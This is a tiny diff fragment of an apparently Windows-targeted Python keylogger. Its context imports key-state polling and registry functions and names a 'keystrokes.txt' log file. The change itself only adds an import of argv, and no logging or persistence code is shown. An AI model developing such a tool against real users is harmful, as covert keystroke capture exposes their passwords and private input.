@@ -1,6 +1,7 @@
 from win32api import GetAsyncKeyState, Sleep
 from datetime import datetime
 from winreg import *
+from sys import argv
 
 file = 'keystrokes.txt'
 
